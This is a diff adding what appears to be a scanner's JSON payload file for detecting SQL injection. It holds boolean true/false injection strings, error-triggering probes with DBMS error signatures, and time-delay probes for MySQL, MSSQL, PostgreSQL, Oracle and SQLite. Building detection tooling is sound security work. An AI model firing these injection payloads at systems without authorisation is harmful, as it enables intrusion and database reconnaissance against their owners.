@@ -1,0 +1,142 @@
+{
+  "boolean": {
+    "description": "Boolean-based blind detection payloads (read-only)",
+    "true_conditions": [
+      "' AND '1'='1",
+      "' AND 1=1--",
+      "' AND 1=1#",
+      "\" AND \"1\"=\"1",
+      "\" AND 1=1--",
+      ") AND (1=1",
+      "') AND ('1'='1",
+      "1 AND 1=1",
+      "1' AND '1'='1'--",
+      "' OR '1'='1",
+      "1 OR 1=1",
+      "-1' OR 1=1#",
+      "' OR '1'='1'#",
+      "1' OR '1'='1'#",
+      "' OR 5695=5695#",
+      "' OR 1=1#",
+      "\" OR 1=1#",
+      "' OR 1=1-- "
+    ],
+    "false_conditions": [
+      "' AND '1'='2",
+      "' AND 1=2--",
+      "' AND 1=2#",
+      "\" AND \"1\"=\"2",
+      "\" AND 1=2--",
+      ") AND (1=2",
+      "') AND ('1'='2",
+      "1 AND 1=2",
+      "1' AND '1'='2'--",
+      "' OR '1'='2",
+      "1 OR 1=2",
+      "-1' OR 1=2#",
+      "' OR '1'='2'#",
+      "1' OR '1'='2'#",
+      "' OR 5695=5696#",
+      "' OR 1=2#",
+      "\" OR 1=2#",
+      "' OR 1=2-- "
+    ]
+  },
+  "error_based": {
+    "description": "Payloads that trigger DB errors to fingerprint DBMS (read-only)",
+    "probes": [
+      "'",
+      "''",
+      "`",
+      "\"",
+      "\\",
+      "%27",
+      "%22",
+      "';--",
+      "' --",
+      "'/*",
+      "') --",
+      "1'",
+      "1\"",
+      "1`"
+    ],
+    "signatures": {
+      "MySQL": [
+        "you have an error in your sql syntax",
+        "warning: mysql",
+        "mysql_fetch",
+        "mysql_num_rows",
+        "supplied argument is not a valid mysql",
+        "mysql server version for the right syntax"
+      ],
+      "PostgreSQL": [
+        "pg_query()",
+        "pg_exec()",
+        "postgresql",
+        "psql:",
+        "pg_num_rows",
+        "unterminated quoted string at or near"
+      ],
+      "MSSQL": [
+        "unclosed quotation mark after the character string",
+        "incorrect syntax near",
+        "microsoft ole db provider for sql server",
+        "odbc sql server driver",
+        "sqlsrv_query()",
+        "mssql_query()"
+      ],
+      "Oracle": [
+        "ora-00933",
+        "ora-00907",
+        "ora-00942",
+        "oracle error",
+        "oracle.*driver",
+        "quoted string not properly terminated"
+      ],
+      "SQLite": [
+        "sqlite_",
+        "sqlite3::",
+        "sqlite.exception",
+        "system.data.sqlite"
+      ],
+      "Generic": [
+        "sql syntax",
+        "sql error",
+        "syntax error",
+        "database error",
+        "query failed",
+        "invalid query",
+        "unexpected end of sql"
+      ]
+    }
+  },
+  "time_based": {
+    "description": "Time-delay detection payloads (read-only, non-destructive)",
+    "probes": {
+      "MySQL": [
+        "' AND SLEEP(5)--",
+        "\" AND SLEEP(5)--",
+        "1 AND SLEEP(5)",
+        "agent' AND (SELECT 8507 FROM (SELECT(SLEEP(5)))DhQZ)-- ZeUB",
+        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))A)--",
+        "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))A)--",
+        "'; WAITFOR DELAY '0:0:5'--"
+      ],
+      "MSSQL": [
+        "'; WAITFOR DELAY '0:0:5'--",
+        "1; WAITFOR DELAY '0:0:5'--"
+      ],
+      "PostgreSQL": [
+        "'; SELECT pg_sleep(5)--",
+        "1; SELECT pg_sleep(5)--"
+      ],
+      "Oracle": [
+        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
+      ],
+      "SQLite": [
+        "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--"
+      ]
+    },
+    "threshold_seconds": 4.5
+  }
+}
